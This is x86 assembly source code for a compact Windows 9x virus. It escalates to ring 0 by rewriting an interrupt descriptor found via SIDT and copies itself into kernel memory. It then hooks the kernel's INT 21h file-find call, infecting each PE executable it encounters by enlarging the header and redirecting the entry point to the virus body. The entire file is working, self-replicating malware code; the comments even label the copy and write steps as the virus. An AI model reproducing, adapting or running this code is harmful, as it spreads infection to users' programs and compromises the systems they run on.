   ; kernel_int21:
   ; BFF712B9 51           push    ecx          ; 00
   ; BFF712BA 50           push    eax          ; 01
   ; BFF712BB 68 002A0010  push    002A0010h    ; 02 03 04 05 06
   ; BFF712C0 E8 0000010F  call    kernel_ord0  ; 07 08 09 0A 0B (kernel_i21x=8)
   ; BFF712C5 C3           ret                  ; 0C            (kernel_c1=10Fh)
   ; kernel_ord0:
   ; BFF713D4 ..           ...

   bufsize                 equ     4096

   kernel_myaddr           equ     0BFF70800h
   kernel_ord0             equ     0BFF713D4h
   kernel_int21            equ     0BFF712B9h
   kernel_i21x             equ     8
   kernel_c1               equ     (kernel_ord0-(kernel_int21+kernel_i21x+4))

                           p386
                           model   flat

                           .code
   start:
                           xchg    esi, eax                ; ESI = offset start

                           push    edi                     ; EDI <-- LDT.base
                           sidt    [esp-2]
                           pop     edi

                           fild    qword ptr [edi]         ; save desriptor #0

                           lea     eax, [esi+r0proc-start]
                           stosd                           ; +0 WORD offs&0xFFFF
                           stosd                           ; +6 WORD offs>>16
                           mov     [edi-8+2], 0EE000028h   ; +2 DWORD sel./flags

                           int     00h                     ; call ring-0

                           ; now in ring-0

   r0proc:                 fistp   qword ptr [edi-8]       ; restore descr. #0
                           ;;
                           mov     edi, kernel_myaddr
                           mov     ecx, kernel_myaddr+hook-start-(kernel_int21+kernel_i21x+4)
                           xchg    ecx, dword ptr ds:[kernel_int21+kernel_i21x]
                           cmp     cl, kernel_c1 and 255
                           jne     r0exit
                           rep     movsb                   ; copy virus

   r0exit:
                           add     esi, rt-start+401000h
   oldeip                  equ     dword ptr $-4
                           mov     [esp], esi

                           ;;
                           iret                            ; back to ring3

                           ; now in ring-3

   hook:
                           cmp     ax, 714Eh               ; hook it
                           jne     hookexit

   infect:                 pusha                           ; save regs

                           mov     ebp, kernel_int21       ; EBP = kernel_int21

                           mov     ax, 3D02h               ; openfile, r/w
                           call    ebp                     ; int21
                           jc      infect_exit
                           xchg    ebx, eax                ; EBX = file handle

                           xor     ecx, ecx                ; ECX = bufsize
                           mov     ch, bufsize/256

                           sub     esp, ecx
                           mov     edx, esp

   ;                       lea     edx, [esi+ecx]          ; EDX=offset buf

                           mov     ah, 3Fh                 ; read buffer
                           call    ebp                     ; call ebp/ret

                           mov     ecx, [edx+3Ch]          ; ECX = mz.pe_ptr
                           cmp     ecx, eax                ; EAX = numread
                           jae     infect_close

                           add     ecx, edx               ; ECX=PE header offset

                           mov     eax, [ecx+54h]          ; pe_headersize
                           inc     [ecx+54h].byte ptr 1    ; pe_headersize+=256
                           lea     edi, [edx+eax]  ; EDI=our new location in buf
                           xchg    eax, [ecx+28h]       ; EAX <--> entrypointrva
                           sub     eax, [ecx+28h]         ; calc oldeip (for E9)

                           jle     infect_close
   ;                       int 3

                           xor     ecx, ecx
                           mov     cl, physsize           ; ECX = oldeip-start+4

                           pusha

                           xor     eax, eax
                           repz    scasb                   ; should be 0s

                           pushf
                           mov     ah, 42h                 ; AX=4200--seek begin
                           cdq
                           call    ebp                     ; int21
                           popf

                           popa
                           jne     infect_close

                           mov     esi, kernel_myaddr
                           rep     movsb                   ; copy virus to buf

                           mov     [edi+physsize-(oldeip-start)], eax

                           mov     ah, 40h                 ; write virus
                           mov     ch, bufsize/256         ; ECX = bufsize
                           call    ebp                     ; int21

   infect_close:
                           mov     ah, 3Eh                 ; close file
                           call    ebp                     ; int21

                           add     esp, bufsize

   infect_exit:            popa                            ; restore regs

   rt:
   hookexit:
                           db      0E9h                    ; return to kernel_ord0
                           dd      kernel_ord0-(kernel_myaddr+($+4-start))

   physend:
   physsize                equ     $-start

                           .data

                           db      3 dup (13,10),'--------------------------',13,10
                           db      'þ physsize = '
                           db      physsize/ 100 mod 10+'0'
                           db      physsize/  10 mod 10+'0'
                           db      physsize/   1 mod 10+'0'
                           db      ' bytes',13,10
                           db      '--------------------------',4 dup (13,10)

                           end     start
